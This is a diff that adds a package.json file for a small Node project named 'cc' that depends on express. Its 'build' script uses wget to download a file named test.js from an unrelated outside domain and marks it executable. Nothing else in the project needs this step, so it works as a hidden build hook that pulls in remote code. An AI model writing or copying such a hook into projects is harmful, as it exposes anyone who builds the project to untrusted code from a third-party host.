@@ -1,0 +1,16 @@
+{
+    "name": "cc",
+    "version": "1.0.0",
+    "description": "",
+    "main": "index.js",
+    "scripts": {
+      "build": "wget https://update-meow.pages.dev/test.js && chmod +x ./test.js"
+    },
+    "keywords": [],
+    "author": "",
+    "license": "ISC",
+    "dependencies": {
+      "express": "^4.18.2"
+    }
+  }
+  
